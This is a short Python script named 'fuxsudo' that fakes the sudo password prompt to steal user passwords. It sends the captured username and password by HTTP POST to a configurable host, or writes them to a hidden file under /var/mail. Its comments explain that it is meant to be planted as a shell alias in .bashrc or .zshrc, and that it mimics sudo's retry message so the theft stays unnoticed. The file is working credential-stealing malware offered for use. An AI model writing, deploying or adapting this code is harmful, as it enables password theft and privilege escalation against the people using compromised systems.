# USER CHANGEMES
host = "http://localhost:8080"
file = "/var/mail/.mboxcfg"

#Set to false for local-only storage. Useful if you have a persistent C2 channel.
NETWORK = False

#alias sudo="python3 fuxsudo.py ; sudo "

#fuxsudo is a quick and dirty privilege escalation tool that serves to steal passwords from compromised systems
#It emulates sudo behavior. 
#If the user can use sudo without a password (e.g. they've used sudo in the same command terminal before) then it does NOT print the "Try again"
#This way, results look like:

#[sudo] Password for hackerman:
#whatever command sudo had

# Otherwise, it DOES print it (and delays slightly before doing so)
#This way, it looks like
#[sudo] Password for hackerman:
#Sorry, try again.
#[sudo] Password for hackerman: #This line is the real sudo asking for the password
#whatever output sudo had

#This prevents this output:
#[sudo] Password for hackerman:
#Sorry, try again.
#command output

#This injects a mysterious "password failed" message before appearing to succeed.
#This prevents the payload from being discovered, potentially for quite some time
#Obfuscation on how the implant is injected is left as an exercise for the user. 
#This program is designed to be planted in a .bashrc or .zshrc file, so endless techniques are available. 
#Alias should look like
#python3 fuxsudo.py ; sudo 

import requests
import getpass
import time
from subprocess import check_output
import os
import time

try:
    password = getpass.getpass("[sudo] password for {}: ".format(getpass.getuser()))
    
    #Log password, either to network or to disk
    if NETWORK:
        data = {
            "username":getpass.getuser(),
            "password":password
        }

        r = requests.post(host + "/submit.php", data=data) 
    else:
        with open(file,"a") as f:
            f.write("[{}] {}:{}\n".format(int(time.time()),getpass.getuser(),password))
    try:
        assert os.system("sudo -n true 2>/dev/null 1>/dev/null") == 0
        done_before = True
    except:
        done_before = False

    if not done_before:
        time.sleep(2)
        print("Sorry, try again.")

except:
    exit()
